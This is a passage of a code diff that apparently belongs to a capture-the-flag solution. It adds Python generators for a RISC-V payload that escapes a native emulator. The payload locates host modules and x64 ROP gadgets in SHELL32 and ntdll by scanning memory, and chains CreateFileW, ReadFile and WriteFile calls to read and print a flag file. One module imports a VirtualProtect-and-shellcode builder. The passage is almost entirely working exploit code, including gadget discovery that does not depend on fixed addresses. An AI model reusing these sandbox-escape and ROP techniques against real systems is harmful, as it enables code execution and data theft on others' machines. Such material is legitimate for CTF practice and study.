+    load(a, &quot;lwu&quot;, T4, T3, 0x50)
+    li(a, T5, 0x4000)
+    a.branch(&quot;bne&quot;, T4, T5, &quot;next_stack&quot;)
+    load(a, &quot;ld&quot;, T4, S3, -8)
+    a.branch(&quot;bne&quot;, T4, S0, &quot;next_stack&quot;)
+    load(a, &quot;ld&quot;, T4, S3, 8)
+    a.branch(&quot;bne&quot;, T4, S0, &quot;next_stack&quot;)
+    add(a, S5, T1, X0)            # main_base
+    add(a, S6, S3, X0)            # ret_slot
+    a.jal(X0, &quot;found_stack&quot;)
+
+    a.label(&quot;next_stack&quot;)
+    addi(a, S3, S3, 8)
+    a.jal(X0, &quot;stack_scan&quot;)
+
+    a.label(&quot;found_stack&quot;)
+    # shell32_base = module base for CommandLineToArgvW import.
+    add_large(a, T0, S5, 0x2050)
+    load(a, &quot;ld&quot;, S7, T0, 0)
+    srli(a, S7, S7, 16)
+    slli(a, S7, S7, 16)
+
+    a.label(&quot;shell_scan&quot;)
+    load(a, &quot;lhu&quot;, T0, S7, 0)
+    li(a, T1, 0x5A4D)
+    a.branch(&quot;bne&quot;, T0, T1, &quot;prev_shell&quot;)
+    load(a, &quot;lwu&quot;, T0, S7, 0x3C)
+    li(a, T1, 0x1000)
+    a.branch(&quot;bgeu&quot;, T0, T1, &quot;prev_shell&quot;)
+    add(a, T1, S7, T0)
+    load(a, &quot;lwu&quot;, T2, T1, 0)
+    li(a, T3, 0x4550)
+    a.branch(&quot;beq&quot;, T2, T3, &quot;found_shell&quot;)
+
+    a.label(&quot;prev_shell&quot;)
+    add_large(a, S7, S7, -0x10000)
+    a.jal(X0, &quot;shell_scan&quot;)
+
+    a.label(&quot;found_shell&quot;)
+    # Find ntdll by scanning nearby loader/heap module-base pointers for the
+    # stable local gadget bytes: pop r9; pop r10; pop r11; ret.
+    add_large(a, S10, S2, -0xC000)  # cursor
+    add(a, S11, S2, X0)             # end
+
+    a.label(&quot;module_scan&quot;)
+    a.branch(&quot;bgeu&quot;, S10, S11, &quot;fail&quot;)
+    load(a, &quot;ld&quot;, A4, S10, 0)
+    srli(a, A5, A4, 16)
+    slli(a, A5, A5, 16)
+    a.branch(&quot;bne&quot;, A4, A5, &quot;next_module&quot;)
+    srli(a, A5, A4, 40)
+    li(a, A6, 0x7F)
+    a.branch(&quot;bne&quot;, A5, A6, &quot;next_module&quot;)
+    load(a, &quot;lhu&quot;, A5, A4, 0)
+    li(a, A6, 0x5A4D)
+    a.branch(&quot;bne&quot;, A5, A6, &quot;next_module&quot;)
+    load(a, &quot;lwu&quot;, A5, A4, 0x3C)
+    li(a, A6, 0x1000)
+    a.branch(&quot;bgeu&quot;, A5, A6, &quot;next_module&quot;)
+    add(a, A6, A4, A5)
+    load(a, &quot;lwu&quot;, A5, A6, 0)
+    li(a, A7, 0x4550)
+    a.branch(&quot;bne&quot;, A5, A7, &quot;next_module&quot;)
+    load(a, &quot;lwu&quot;, A5, A6, 0x50)
+    li(a, A7, 0x11F6DD)
+    a.branch(&quot;bltu&quot;, A5, A7, &quot;next_module&quot;)
+    add_large(a, A5, A4, 0x11F6D6)
+    load(a, &quot;lwu&quot;, A6, A5, 0)
+    li(a, A7, 0x5A415941)
+    a.branch(&quot;bne&quot;, A6, A7, &quot;next_module&quot;)
+    load(a, &quot;lhu&quot;, A6, A5, 4)
+    li(a, A7, 0x5B41)
+    a.branch(&quot;bne&quot;, A6, A7, &quot;next_module&quot;)
+    load(a, &quot;lbu&quot;, A6, A5, 6)
+    li(a, A7, 0xC3)
+    a.branch(&quot;bne&quot;, A6, A7, &quot;next_module&quot;)
+    add(a, S10, A4, X0)            # ntdll base
+    a.jal(X0, &quot;found_ntdll&quot;)
+
+    a.label(&quot;next_module&quot;)
+    addi(a, S10, S10, 8)
+    a.jal(X0, &quot;module_scan&quot;)
+
+    a.label(&quot;found_ntdll&quot;)
+    # Write UTF-16LE C:\\chall\\flag.txt into zeroed heap memory.
+    add_large(a, S8, S0, 0x1700)  # path
+    add(a, S4, S8, X0)
+    for q in [
+        0x0063005C003A0043,
+        0x006C006C00610068,
+        0x0061006C0066005C,
+        0x00780074002E0067,
+        0x0000000000000074,
+    ]:
+        store_const(a, q)
+
+    add_large(a, S9, S0, 0x1800)  # read buffer, already zeroed
+
+    if mode == &quot;write_test&quot;:
+        add(a, S4, S9, X0)
+        for q in [
+            0x2054534554504F52,  # ROPTEST 
+            0x7B465443696E6D4F,  # OmniCTF{
+            0x45525F4C41434F4C,  # LOCAL_RE
+            0x7D545345545F4C41,  # AL_TEST}
+            0x000000000000000A,
+        ]:
+            store_const(a, q)
+
+    # ROP gadgets in SHELL32.dll on the local challenge build.
+    POP_RCX = 0x1806B
+    RET_ALIGN = 0x1806C
+    POP_RDX = 0x5E64F
+    MOV_RCX_RAX = 0x105B7E
+    POP_R8 = 0x1DE2B9       # pop r8; mov rax, rcx; ret
+    ADD_RSP_28 = 0x1265E7   # add rsp, 0x28; ret
+    POP_R9_R10_R11 = 0x11F6D6
+
+    # s4 is chain cursor, starting at the interpreter return address.
+    add(a, S4, S6, X0)
+
+    if mode == &quot;write_test&quot;:
+        # GetStdHandle(STD_OUTPUT_HANDLE), then WriteFile(stdout, known_buf, 40, NULL, NULL).
+        store_add_base(a, S7, POP_RCX)
+        store_const(a, 0xFFFFFFF5)
+        store_add_base(a, S7, RET_ALIGN)
+        store_loaded_iat(a, S5, 0x2010)
+        store_add_base(a, S7, MOV_RCX_RAX)
+        for _ in range(7):
+            store_const(a, 0)
+        store_add_base(a, S10, POP_R9_R10_R11)
+        store_add_base(a, S0, 0x1608)
+        store_const(a, 0)
+        store_const(a, 0)
+        store_add_base(a, S7, POP_RDX)
+        store_inc(a, S9)
+        store_add_base(a, S7, POP_R8)
+        store_const(a, 40)
+        store_add_base(a, S7, RET_ALIGN)
+        store_loaded_iat(a, S5, 0x2018)
+        store_add_base(a, S7, ADD_RSP_28)
+        for _ in range(5):
+            store_const(a, 0)
+        store_const(a, 0)
+        a.jal(X0, &quot;trigger&quot;)
+        a.label(&quot;fail&quot;)
+        if spin_after_write:
+            a.jal(X0, &quot;fail&quot;)
+            addi(a, X0, X0, 0)
+        else:
+            li(a, A7, 0x5D)
+            a.emit(0x00000073)
+            addi(a, X0, X0, 0)
+        a.label(&quot;trigger&quot;)
+        if spin_after_write:
+            a.jal(X0, &quot;trigger&quot;)
+            addi(a, X0, X0, 0)
+        else:
+            li(a, A7, 0x5D)
+            a.emit(0x00000073)
+            addi(a, X0, X0, 0)
+        return a.resolve()
+
+    # Alignment ret, then CreateFileW(path, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, NORMAL, 0).
+    store_add_base(a, S7, RET_ALIGN)
+    store_add_base(a, S10, POP_R9_R10_R11)
+    store_const(a, 0)
+    store_const(a, 0)
+    store_const(a, 0)
+    store_add_base(a, S7, POP_RCX)
+    store_inc(a, S8)
+    store_add_base(a, S7, POP_RDX)
+    store_const(a, 0x80000000)
+    store_add_base(a, S7, POP_R8)
+    store_const(a, 1)
+    store_loaded_iat(a, S5, 0x2020)      # CreateFileW
+    store_add_base(a, S7, MOV_RCX_RAX)   # rcx = returned handle
+    for _ in range(4):
+        store_const(a, 0)
+    store_const(a, 3)
+    store_const(a, 0x80)
+    store_const(a, 0)
+
+    # ReadFile(handle, buf, 0x100, NULL, NULL).
+    store_add_base(a, S10, POP_R9_R10_R11)
+    store_add_base(a, S0, 0x1600)
+    store_const(a, 0)
+    store_const(a, 0)
+    store_add_base(a, S7, POP_RDX)
+    store_inc(a, S9)
+    store_add_base(a, S7, POP_R8)
+    store_const(a, 0x100)
+    store_add_base(a, S7, RET_ALIGN)
+    store_loaded_iat(a, S5, 0x2000)      # ReadFile
+    store_add_base(a, S7, ADD_RSP_28)
+    for _ in range(5):
+        store_const(a, 0)
+
+    # GetStdHandle(STD_OUTPUT_HANDLE), then WriteFile(stdout, buf, 0x100, NULL, NULL).
+    store_add_base(a, S7, POP_RCX)
+    store_const(a, 0xFFFFFFF5)
+    store_add_base(a, S7, RET_ALIGN)
+    store_loaded_iat(a, S5, 0x2010)      # GetStdHandle
+    store_add_base(a, S7, MOV_RCX_RAX)   # rcx = stdout handle
+    for _ in range(7):
+        store_const(a, 0)
+    store_add_base(a, S10, POP_R9_R10_R11)
+    store_add_base(a, S0, 0x1608)
+    store_const(a, 0)
+    store_const(a, 0)
+    store_add_base(a, S7, POP_RDX)
+    store_inc(a, S9)
+    store_add_base(a, S7, POP_R8)
+    store_const(a, 0x100)
+    store_add_base(a, S7, RET_ALIGN)
+    store_loaded_iat(a, S5, 0x2018)      # WriteFile
+    store_add_base(a, S7, ADD_RSP_28)
+    for _ in range(5):
+        store_const(a, 0)
+    store_const(a, 0)                    # crash after output is captured
+    a.jal(X0, &quot;trigger&quot;)
+
+    # Return from the native interpreter through INVALID_INSTRUCTION with r9=0.
+    a.label(&quot;fail&quot;)
+    if spin_after_write:
+        a.jal(X0, &quot;fail&quot;)
+        addi(a, X0, X0, 0)
+    else:
+        li(a, A7, 0x5D)
+        a.emit(0x00000073)
+        addi(a, X0, X0, 0)
+    a.label(&quot;trigger&quot;)
+    if spin_after_write:
+        a.jal(X0, &quot;trigger&quot;)
+        addi(a, X0, X0, 0)
+    else:
+        li(a, A7, 0x5D)
+        a.emit(0x00000073)
+        addi(a, X0, X0, 0)
+
+    return a.resolve()
+
+
+def main():
+    payload = build(
+        spin_after_write=os.environ.get(&quot;SPIN_AFTER_WRITE&quot;) == &quot;1&quot;,
+        mode=os.environ.get(&quot;ROP_MODE&quot;, &quot;real&quot;),
+    )
+    pad_to = os.environ.get(&quot;PAD_TO&quot;)
+    if pad_to:
+        target = int(pad_to, 0)
+        if len(payload) &gt; target or (target - len(payload)) % 4:
+            raise SystemExit(f&quot;cannot pad {len(payload)} bytes to {target}&quot;)
+        payload += b&quot;\x13\x00\x00\x00&quot; * ((target - len(payload)) // 4)
+    out = Path(&quot;sol&quot;)
+    out.mkdir(exist_ok=True)
+    (out / &quot;real_rop.bin&quot;).write_bytes(payload)
+    (out / &quot;real_rop.b64&quot;).write_text(base64.b64encode(payload).decode(), newline=&quot;&quot;)
+    print(f&quot;wrote {out / &#x27;real_rop.bin&#x27;} ({len(payload)} bytes)&quot;)
+    print(f&quot;wrote {out / &#x27;real_rop.b64&#x27;} ({len(base64.b64encode(payload))} bytes base64)&quot;)
+
+
+if __name__ == &quot;__main__&quot;:
+    main()
+</code></pre></div>
+</details>
+<details class="file">
+  <summary><span>make_real_rop_dynamic.py</span><span class="meta">11,967 bytes / SHA256 BACE9FF5F0E6B154...</span></summary>
+  <div class="codebox"><pre><code class="language-py">#!/usr/bin/env python3
+import base64
+import os
+from pathlib import Path
+
+from make_real_rop import (
+    A0,
+    A1,
+    A2,
+    A3,
+    A4,
+    A5,
+    A6,
+    A7,
+    S0,
+    S1,
+    S2,
+    S3,
+    S4,
+    S5,
+    S6,
+    S7,
+    S8,
+    S9,
+    S10,
+    S11,
+    T0,
+    T1,
+    T2,
+    T3,
+    T4,
+    T5,
+    T6,
+    X0,
+    Asm,
+    add,
+    add_large,
+    addi,
+    auipc,
+    li,
+    load,
+    srli,
+    slli,
+    store,
+    store_const,
+    store_inc,
+    store_loaded_iat,
+    sub,
+)
+
+
+SLOT_POP_RCX = 0x00
+SLOT_RET_ALIGN = 0x08
+SLOT_POP_RDX = 0x10
+SLOT_MOV_RCX_RAX = 0x18
+SLOT_POP_R8 = 0x20
+SLOT_ADD_RSP_28 = 0x28
+SLOT_POP_R9_R10_R11 = 0x30
+
+
+def round_up(val, align):
+    return (val + align - 1) &amp; ~(align - 1)
+
+
+def store_at_ctx(a, src, off):
+    add_large(a, T6, S0, off)
+    store(a, &quot;sd&quot;, src, T6, 0)
+
+
+def load_from_ctx(a, dst, off):
+    add_large(a, T6, S0, off)
+    load(a, &quot;ld&quot;, dst, T6, 0)
+
+
+def store_ctx_slot_inc(a, base_off, slot_off):
+    load_from_ctx(a, T0, base_off + slot_off)
+    store_inc(a, T0)
+
+
+def add_loaded_slot(a, dst, base_off, slot_off, delta):
+    load_from_ctx(a, dst, base_off + slot_off)
+    addi(a, dst, dst, delta)
+
+
+def parse_first_section(a, module_reg, text_base_reg, text_size_reg):
+    load(a, &quot;lwu&quot;, T0, module_reg, 0x3C)
+    add(a, T1, module_reg, T0)
+    load(a, &quot;lhu&quot;, T2, T1, 0x14)
+    add(a, T3, T1, T2)
+    addi(a, T3, T3, 0x18)
+    load(a, &quot;lwu&quot;, T4, T3, 0x08)  # VirtualSize
+    load(a, &quot;lwu&quot;, T5, T3, 0x0C)  # VirtualAddress
+    add(a, text_base_reg, module_reg, T5)
+    add(a, text_size_reg, T4, X0)
+
+
+def scan_pattern(a, name, base_reg, size_reg, pattern, slot_off, layout, not_found_label, found_label=None):
+    loop = f&quot;scan_{name}&quot;
+    next_label = f&quot;next_{name}&quot;
+    done_label = f&quot;done_{name}&quot;
+
+    add(a, S11, base_reg, X0)
+    add(a, A6, base_reg, size_reg)
+    add_large(a, A6, A6, -len(pattern))
+
+    a.label(loop)
+    a.branch(&quot;bgeu&quot;, S11, A6, not_found_label)
+    for i, byte in enumerate(pattern):
+        load(a, &quot;lbu&quot;, T0, S11, i)
+        li(a, T1, byte)
+        a.branch(&quot;bne&quot;, T0, T1, next_label)
+
+    store_at_ctx(a, S11, layout[&quot;slot_base&quot;] + slot_off)
+    if found_label:
+        a.jal(X0, found_label)
+    else:
+        a.jal(X0, done_label)
+
+    a.label(next_label)
+    addi(a, S11, S11, 1)
+    a.jal(X0, loop)
+    if not found_label:
+        a.label(done_label)
+
+
+def emit_common_discovery(a):
+    # s0 = VM context; payload starts at context+0x110.
+    auipc(a, S0, 0)
+    addi(a, S0, S0, -0x110)
+
+    # Find a native stack page through heap metadata and validate it by
+    # locating the interpreter frame: ctx, main+0x1ccc, ctx.
+    srli(a, S2, S0, 16)
+    slli(a, S2, S2, 16)
+    add_large(a, S11, S2, -0x7000)
+    add_large(a, S6, S2, -0x1000)
+
+    a.label(&quot;stack_candidate&quot;)
+    a.branch(&quot;bgeu&quot;, S11, S6, &quot;fail&quot;)
+    load(a, &quot;ld&quot;, S1, S11, 0)
+    addi(a, S11, S11, 8)
+
+    srli(a, T0, S1, 36)
+    a.branch(&quot;beq&quot;, T0, X0, &quot;stack_candidate&quot;)
+    srli(a, T0, S1, 44)
+    a.branch(&quot;bne&quot;, T0, X0, &quot;stack_candidate&quot;)
+    srli(a, T0, S1, 3)
+    slli(a, T0, T0, 3)
+    a.branch(&quot;bne&quot;, T0, S1, &quot;stack_candidate&quot;)
+    srli(a, T0, S1, 40)
+    li(a, T1, 0x7F)
+    a.branch(&quot;beq&quot;, T0, T1, &quot;stack_candidate&quot;)
+    srli(a, S1, S1, 12)
+    slli(a, S1, S1, 12)
+    srli(a, T0, S1, 32)
+    srli(a, T1, S2, 32)
+    a.branch(&quot;beq&quot;, T0, T1, &quot;stack_candidate&quot;)
+    add_large(a, T0, S2, -0x30000)
+    a.branch(&quot;bltu&quot;, S1, T0, &quot;candidate_page_ok&quot;)
+    add_large(a, T0, S2, 0x30000)
+    a.branch(&quot;bltu&quot;, S1, T0, &quot;stack_candidate&quot;)
+
+    a.label(&quot;candidate_page_ok&quot;)
+    add(a, S3, S1, X0)
+    add_large(a, S4, S1, 0x1000)
+
+    a.label(&quot;stack_scan&quot;)
+    a.branch(&quot;bgeu&quot;, S3, S4, &quot;stack_candidate&quot;)
+    load(a, &quot;ld&quot;, T0, S3, 0)
+    add_large(a, T1, T0, -0x1CCC)
+
+    srli(a, T2, T1, 40)
+    li(a, T3, 0x7F)
+    a.branch(&quot;bne&quot;, T2, T3, &quot;next_stack&quot;)
+    srli(a, T2, T1, 16)
+    slli(a, T2, T2, 16)
+    a.branch(&quot;bne&quot;, T1, T2, &quot;next_stack&quot;)
+    load(a, &quot;lhu&quot;, T2, T1, 0)
+    li(a, T3, 0x5A4D)
+    a.branch(&quot;bne&quot;, T2, T3, &quot;next_stack&quot;)
+    load(a, &quot;lwu&quot;, T2, T1, 0x3C)
+    li(a, T3, 0x1000)
+    a.branch(&quot;bgeu&quot;, T2, T3, &quot;next_stack&quot;)
+    add(a, T3, T1, T2)
+    load(a, &quot;lwu&quot;, T4, T3, 0)
+    li(a, T5, 0x4550)
+    a.branch(&quot;bne&quot;, T4, T5, &quot;next_stack&quot;)
+    load(a, &quot;lwu&quot;, T4, T3, 0x50)
+    li(a, T5, 0x4000)
+    a.branch(&quot;bne&quot;, T4, T5, &quot;next_stack&quot;)
+    load(a, &quot;ld&quot;, T4, S3, -8)
+    a.branch(&quot;bne&quot;, T4, S0, &quot;next_stack&quot;)
+    load(a, &quot;ld&quot;, T4, S3, 8)
+    a.branch(&quot;bne&quot;, T4, S0, &quot;next_stack&quot;)
+    add(a, S5, T1, X0)  # main_base
+    add(a, S6, S3, X0)  # ret_slot
+    a.jal(X0, &quot;found_stack&quot;)
+
+    a.label(&quot;next_stack&quot;)
+    addi(a, S3, S3, 8)
+    a.jal(X0, &quot;stack_scan&quot;)
+
+    a.label(&quot;found_stack&quot;)
+    # shell32_base = module base for CommandLineToArgvW import.
+    add_large(a, T0, S5, 0x2050)
+    load(a, &quot;ld&quot;, S7, T0, 0)
+    srli(a, S7, S7, 16)
+    slli(a, S7, S7, 16)
+
+    a.label(&quot;shell_base_scan&quot;)
+    load(a, &quot;lhu&quot;, T0, S7, 0)
+    li(a, T1, 0x5A4D)
+    a.branch(&quot;bne&quot;, T0, T1, &quot;prev_shell_base&quot;)
+    load(a, &quot;lwu&quot;, T0, S7, 0x3C)
+    li(a, T1, 0x1000)
+    a.branch(&quot;bgeu&quot;, T0, T1, &quot;prev_shell_base&quot;)
+    add(a, T1, S7, T0)
+    load(a, &quot;lwu&quot;, T2, T1, 0)
+    li(a, T3, 0x4550)
+    a.branch(&quot;beq&quot;, T2, T3, &quot;found_shell_base&quot;)
+
+    a.label(&quot;prev_shell_base&quot;)
+    add_large(a, S7, S7, -0x10000)
+    a.jal(X0, &quot;shell_base_scan&quot;)
+
+    a.label(&quot;found_shell_base&quot;)
+
+
+def emit_dynamic_gadget_discovery(a, layout):
+    parse_first_section(a, S7, A0, A1)
+
+    scan_pattern(a, &quot;pop_rcx&quot;, A0, A1, bytes.fromhex(&quot;59 c3&quot;), SLOT_POP_RCX, layout, &quot;fail&quot;)
+    add_loaded_slot(a, T0, layout[&quot;slot_base&quot;], SLOT_POP_RCX, 1)
+    store_at_ctx(a, T0, layout[&quot;slot_base&quot;] + SLOT_RET_ALIGN)
+    scan_pattern(a, &quot;pop_rdx&quot;, A0, A1, bytes.fromhex(&quot;5a c3&quot;), SLOT_POP_RDX, layout, &quot;fail&quot;)
+    scan_pattern(
+        a,
+        &quot;mov_rcx_rax&quot;,
+        A0,
+        A1,
+        bytes.fromhex(&quot;48 8b c8 48 8b 5c 24 40 48 8b c1 48 8b 74 24 48 48 83 c4 30 5f c3&quot;),
+        SLOT_MOV_RCX_RAX,
+        layout,
+        &quot;fail&quot;,
+    )
+    scan_pattern(a, &quot;pop_r8&quot;, A0, A1, bytes.fromhex(&quot;41 58 48 8b c1 c3&quot;), SLOT_POP_R8, layout, &quot;fail&quot;)
+    scan_pattern(a, &quot;add_rsp_28&quot;, A0, A1, bytes.fromhex(&quot;48 83 c4 28 c3 cc 85 d2 74 1d&quot;), SLOT_ADD_RSP_28, layout, &quot;fail&quot;)
+
+    # Find a loaded module whose first executable section contains:
+    # pop r9; pop r10; pop r11; ret.  Locally this is ntdll, but we do not
+    # rely on its base or RVA.
+    add_large(a, S10, S2, -0xC000)
+    add(a, S11, S2, X0)
+
+    a.label(&quot;module_scan&quot;)
+    a.branch(&quot;bgeu&quot;, S10, S11, &quot;fail&quot;)
+    load(a, &quot;ld&quot;, A4, S10, 0)
+    addi(a, S10, S10, 8)
+    srli(a, A5, A4, 16)
+    slli(a, A5, A5, 16)
+    a.branch(&quot;bne&quot;, A4, A5, &quot;module_scan&quot;)
+    srli(a, A5, A4, 40)
+    li(a, A6, 0x7F)
+    a.branch(&quot;bne&quot;, A5, A6, &quot;module_scan&quot;)
+    load(a, &quot;lhu&quot;, A5, A4, 0)
+    li(a, A6, 0x5A4D)
+    a.branch(&quot;bne&quot;, A5, A6, &quot;module_scan&quot;)
+    load(a, &quot;lwu&quot;, A5, A4, 0x3C)
+    li(a, A6, 0x1000)
+    a.branch(&quot;bgeu&quot;, A5, A6, &quot;module_scan&quot;)
+    add(a, A6, A4, A5)
+    load(a, &quot;lwu&quot;, A5, A6, 0)
+    li(a, A7, 0x4550)
+    a.branch(&quot;bne&quot;, A5, A7, &quot;module_scan&quot;)
+    load(a, &quot;lwu&quot;, A5, A6, 0x50)
+    li(a, A7, 0x1000)
+    a.branch(&quot;bltu&quot;, A5, A7, &quot;module_scan&quot;)
+    li(a, A7, 0x4000000)
+    a.branch(&quot;bltu&quot;, A7, A5, &quot;module_scan&quot;)
+
+    parse_first_section(a, A4, A2, A3)
+    scan_pattern(
+        a,
+        &quot;pop_r9_r10_r11&quot;,
+        A2,
+        A3,
+        bytes.fromhex(&quot;41 59 41 5a 41 5b c3&quot;),
+        SLOT_POP_R9_R10_R11,
+        layout,
+        &quot;module_scan&quot;,
+        found_label=&quot;found_pop_r9&quot;,
+    )
+
+    a.label(&quot;found_pop_r9&quot;)
+
+
+def emit_write_path(a, layout):
+    add_large(a, S8, S0, layout[&quot;path&quot;])
+    add(a, S4, S8, X0)
+    for qword in [
+        0x0063005C003A0043,
+        0x006C006C00610068,
+        0x0061006C0066005C,
+        0x00780074002E0067,
+        0x0000000000000074,
+    ]:
+        store_const(a, qword)
+    add_large(a, S9, S0, layout[&quot;buffer&quot;])
+
+
+def emit_rop_chain(a, layout):
+    add(a, S4, S6, X0)
+
+    # CreateFileW(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)
+    store_ctx_slot_inc(a, layout[&quot;slot_base&quot;], SLOT_RET_ALIGN)
+    store_ctx_slot_inc(a, layout[&quot;slot_base&quot;], SLOT_POP_R9_R10_R11)
+    store_const(a, 0)
+    store_const(a, 0)
+    store_const(a, 0)
+    store_ctx_slot_inc(a, layout[&quot;slot_base&quot;], SLOT_POP_RCX)
+    store_inc(a, S8)
+    store_ctx_slot_inc(a, layout[&quot;slot_base&quot;], SLOT_POP_RDX)
+    store_const(a, 0x80000000)
+    store_ctx_slot_inc(a, layout[&quot;slot_base&quot;], SLOT_POP_R8)
+    store_const(a, 1)
+    store_loaded_iat(a, S5, 0x2020)
+    store_ctx_slot_inc(a, layout[&quot;slot_base&quot;], SLOT_MOV_RCX_RAX)
+    for _ in range(4):
+        store_const(a, 0)
+    store_const(a, 3)
+    store_const(a, 0x80)
+    store_const(a, 0)
+
+    # ReadFile(handle, buffer, 0x100, &amp;scratch, NULL)
+    store_ctx_slot_inc(a, layout[&quot;slot_base&quot;], SLOT_POP_R9_R10_R11)
+    store_const(a, 0)
+    store_const(a, 0)
+    store_const(a, 0)
+    store_ctx_slot_inc(a, layout[&quot;slot_base&quot;], SLOT_POP_RDX)
+    store_inc(a, S9)
+    store_ctx_slot_inc(a, layout[&quot;slot_base&quot;], SLOT_POP_R8)
+    store_const(a, 0x100)
+    store_ctx_slot_inc(a, layout[&quot;slot_base&quot;], SLOT_RET_ALIGN)
+    store_loaded_iat(a, S5, 0x2000)
+    store_ctx_slot_inc(a, layout[&quot;slot_base&quot;], SLOT_ADD_RSP_28)
+    for _ in range(5):
+        store_const(a, 0)
+
+    # GetStdHandle(STD_OUTPUT_HANDLE), then WriteFile(stdout, buffer, 0x100, &amp;scratch, NULL)
+    store_ctx_slot_inc(a, layout[&quot;slot_base&quot;], SLOT_POP_RCX)
+    store_const(a, 0xFFFFFFF5)
+    store_ctx_slot_inc(a, layout[&quot;slot_base&quot;], SLOT_RET_ALIGN)
+    store_loaded_iat(a, S5, 0x2010)
+    store_ctx_slot_inc(a, layout[&quot;slot_base&quot;], SLOT_MOV_RCX_RAX)
+    for _ in range(7):
+        store_const(a, 0)
+    store_ctx_slot_inc(a, layout[&quot;slot_base&quot;], SLOT_POP_R9_R10_R11)
+    store_const(a, 0)
+    store_const(a, 0)
+    store_const(a, 0)
+    store_ctx_slot_inc(a, layout[&quot;slot_base&quot;], SLOT_POP_RDX)
+    store_inc(a, S9)
+    store_ctx_slot_inc(a, layout[&quot;slot_base&quot;], SLOT_POP_R8)
+    store_const(a, 0x100)
+    store_ctx_slot_inc(a, layout[&quot;slot_base&quot;], SLOT_RET_ALIGN)
+    store_loaded_iat(a, S5, 0x2018)
+    store_ctx_slot_inc(a, layout[&quot;slot_base&quot;], SLOT_ADD_RSP_28)
+    for _ in range(5):
+        store_const(a, 0)
+    store_const(a, 0)
+    a.jal(X0, &quot;trigger&quot;)
+
+
+def build(layout, spin_after_write=False):
+    a = Asm()
+    emit_common_discovery(a)
+    emit_dynamic_gadget_discovery(a, layout)
+    emit_write_path(a, layout)
+    emit_rop_chain(a, layout)
+
+    a.label(&quot;fail&quot;)
+    if spin_after_write:
+        a.jal(X0, &quot;fail&quot;)
+        addi(a, X0, X0, 0)
+    else:
+        li(a, A7, 0x5D)
+        a.emit(0x00000073)
+        addi(a, X0, X0, 0)
+
+    a.label(&quot;trigger&quot;)
+    if spin_after_write:
+        a.jal(X0, &quot;trigger&quot;)
+        addi(a, X0, X0, 0)
+    else:
+        li(a, A7, 0x5D)
+        a.emit(0x00000073)
+        addi(a, X0, X0, 0)
+
+    return a.resolve()
+
+
+def make_layout(slot_base):
+    return {
+        &quot;slot_base&quot;: slot_base,
+        &quot;path&quot;: slot_base + 0x700,
+        &quot;buffer&quot;: slot_base + 0x800,
+    }
+
+
+def main():
+    slot_base = int(os.environ.get(&quot;DYN_SLOT_BASE&quot;, &quot;0x2400&quot;), 0)
+    spin = os.environ.get(&quot;SPIN_AFTER_WRITE&quot;) == &quot;1&quot;
+
+    for _ in range(4):
+        layout = make_layout(slot_base)
+        payload = build(layout, spin_after_write=spin)
+        needed = round_up(0x110 + len(payload) + 0x100, 0x100)
+        if needed &lt;= slot_base:
+            break
+        slot_base = needed
+    else:
+        raise SystemExit(&quot;could not place dynamic data after code&quot;)
+
+    out = Path(&quot;sol&quot;)
+    out.mkdir(exist_ok=True)
+    (out / &quot;real_rop_dynamic.bin&quot;).write_bytes(payload)
+    (out / &quot;real_rop_dynamic.b64&quot;).write_text(base64.b64encode(payload).decode(), newline=&quot;&quot;)
+    print(f&quot;slot_base={layout[&#x27;slot_base&#x27;]:#x}&quot;)
+    print(f&quot;path={layout[&#x27;path&#x27;]:#x}&quot;)
+    print(f&quot;buffer={layout[&#x27;buffer&#x27;]:#x}&quot;)
+    print(f&quot;wrote {out / &#x27;real_rop_dynamic.bin&#x27;} ({len(payload)} bytes)&quot;)
+    print(f&quot;wrote {out / &#x27;real_rop_dynamic.b64&#x27;} ({len(base64.b64encode(payload))} bytes base64)&quot;)
+
+
+if __name__ == &quot;__main__&quot;:
+    main()
+</code></pre></div>
+</details>
+<details class="file">
+  <summary><span>make_real_universal.py</span><span class="meta">10,889 bytes / SHA256 1C80379FFCB05E70...</span></summary>
+  <div class="codebox"><pre><code class="language-py">#!/usr/bin/env python3
+import base64
+import os
+from pathlib import Path
+
+from make_real_rop import (
+    A0,
+    A1,
+    A2,
+    A3,
+    A4,
+    A5,
+    A6,
+    A7,
+    S0,
+    S1,
+    S2,
+    S3,
+    S4,
+    S5,
+    S6,
+    S7,
+    S8,
+    S10,
+    S11,
+    T0,
+    T1,
+    T2,
+    T3,
+    T4,
+    T5,
+    T6,
+    X0,
+    Asm,
+    add,
+    add_large,
+    addi,
+    auipc,
+    li,
+    load,
+    srli,
+    slli,
+    store,
+    store_const,
+    store_inc,
+    sub,
+)
+from make_real_rop_dynamic import (
+    SLOT_POP_R8,
+    SLOT_POP_R9_R10_R11,
+    SLOT_POP_RCX,
+    SLOT_POP_RDX,
+    SLOT_RET_ALIGN,
+    parse_first_section,
+    scan_pattern,
+)
+from make_real_vp_shell import (
+    SLOT_VIRTUALPROTECT,
+    build_shellcode,
+    emit_find_gadget_in_modules,
+    emit_rop,
+    store_at_ctx,
+    load_from_ctx,
+)
+
+
+def find_module_base_from_ret(a, prefix):
+    srli(a, S5, T0, 16)
+    slli(a, S5, S5, 16)
+    add_large(a, A7, S5, -0x2000000)
+
+    a.label(f&quot;{prefix}_ret_base_scan&quot;)
+    a.branch(&quot;bltu&quot;, S5, A7, &quot;next_stack&quot;)
+    load(a, &quot;lhu&quot;, T2, S5, 0)
+    li(a, T3, 0x5A4D)
+    a.branch(&quot;bne&quot;, T2, T3, f&quot;{prefix}_prev_ret_base&quot;)
+    load(a, &quot;lwu&quot;, T2, S5, 0x3C)
+    li(a, T3, 0x1000)
+    a.branch(&quot;bgeu&quot;, T2, T3, f&quot;{prefix}_prev_ret_base&quot;)
+    add(a, T3, S5, T2)
+    load(a, &quot;lwu&quot;, T4, T3, 0)
+    li(a, T5, 0x4550)
+    a.branch(&quot;bne&quot;, T4, T5, f&quot;{prefix}_prev_ret_base&quot;)
+    load(a, &quot;lwu&quot;, T4, T3, 0x50)
+    li(a, T5, 0x1000)
+    a.branch(&quot;bltu&quot;, T4, T5, f&quot;{prefix}_prev_ret_base&quot;)
+    add(a, T5, S5, T4)
+    a.branch(&quot;bltu&quot;, T0, S5, f&quot;{prefix}_prev_ret_base&quot;)
+    a.branch(&quot;bgeu&quot;, T0, T5, f&quot;{prefix}_prev_ret_base&quot;)
+    a.jal(X0, &quot;found_stack&quot;)
+
+    a.label(f&quot;{prefix}_prev_ret_base&quot;)
